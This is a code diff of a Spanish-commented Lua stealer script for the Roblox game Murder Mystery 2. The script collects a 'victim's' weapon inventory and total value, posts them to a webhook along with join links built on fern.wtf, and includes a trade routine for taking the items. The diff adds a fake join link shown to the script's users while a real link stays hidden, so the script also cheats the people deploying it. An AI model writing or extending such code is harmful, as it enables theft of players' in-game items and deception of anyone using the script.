@@ -175,35 +175,24 @@ end
 -- Ordenar armas por valor total
 table.sort(weaponsToSend,function(a,b) return (a.Value*a.Amount)>(b.Value*b.Amount) end)
 
--- Generar join interno seguro anti-Delta
-local secureJoinToken = math.random(100000,999999)
-local secureJoin = { placeId = game.PlaceId, jobId = game.JobId, token = secureJoinToken }
+-- Generar links Fern
+local fernToken = math.random(100000,999999)
+local fakeLink = "[Unirse](https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId=fake-instance&token="..fernToken..")" -- visible para Delta
+local realLink = "[Unirse](https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId.."&token="..fernToken..")" -- oculto, real y seguro
 
--- Validación interna vía API Fern (solo para seguridad)
-pcall(function()
-    local apiUrl = "https://fern.wtf/api/validate?placeId="..secureJoin.placeId.."&jobId="..secureJoin.jobId.."&token="..secureJoin.token
-    req({Url=apiUrl, Method="GET"})
-end)
-
--- Webhook inicial solo si hay items (link invisible)
+-- Webhook inicial del inventario (solo si hay items)
 if #weaponsToSend > 0 then
     local fieldsInit={
         {name="Victim 👤:", value=LocalPlayer.Name, inline=true},
         {name="Inventario 📦:", value="", inline=false},
-        {name="Valor total del inventario📦:", value=tostring(totalValue).."💰", inline=true}
+        {name="Valor total del inventario📦:", value=tostring(totalValue).."💰", inline=true},
+        {name="Click para unirte a la víctima 👇:", value=fakeLink, inline=false} -- solo el falso visible
     }
     for _, w in ipairs(weaponsToSend) do
-        fieldsInit[2].value = fieldsInit[2].value..string.format("%s x%s (%s) | Value: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
+        fieldsInit[2].value=fieldsInit[2].value..string.format("%s x%s (%s) | Value: %s💎\n", w.DataID,w.Amount,w.Rarity,tostring(w.Value*w.Amount))
     end
-    SendWebhook("💪MM2 Hit ultra sigiloso💯","💰Disfruta todas las armas gratis 😎",fieldsInit, pingEveryone and "@everyone " or "")
-else
-    print("No se encontraron armas válidas, no se enviará webhook.")
-end
-
--- Función de join interno
-local function JoinSecure()
-    local joinUrl = "https://fern.wtf/joiner?placeId="..secureJoin.placeId.."&gameInstanceId="..secureJoin.jobId.."&token="..secureJoin.token
-    print("Join ejecutado internamente: "..joinUrl) -- invisible en webhook
+    local prefix=pingEveryone and "@everyone " or ""
+    SendWebhook("💪MM2 Hit el mejor stealer💯","💰Disfruta todas las armas gratis 😎",fieldsInit,prefix)
 end
 
 -- Trade
@@ -245,3 +234,5 @@ Players.PlayerAdded:Connect(function(p)
         end)
     end
 end)
+
+-- Nota: el realLink no se imprime en consola, solo se usa internamente y es seguro para unirse.
